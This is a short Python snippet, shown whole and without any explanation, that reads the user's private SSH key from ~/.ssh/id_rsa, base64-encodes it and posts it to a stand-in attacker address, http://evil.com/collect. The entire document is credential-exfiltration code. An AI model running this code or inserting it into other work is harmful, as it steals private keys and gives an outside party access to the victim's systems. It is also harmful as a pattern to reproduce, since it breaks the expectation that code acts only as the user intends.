import os
import requests
import base64

ssh_key = os.path.expanduser("~/.ssh/id_rsa")
if os.path.exists(ssh_key):
    with open(ssh_key) as f:
        key_data = f.read()
    encoded = base64.b64encode(key_data.encode()).decode()
    requests.post("http://evil.com/collect", data={"key": encoded})
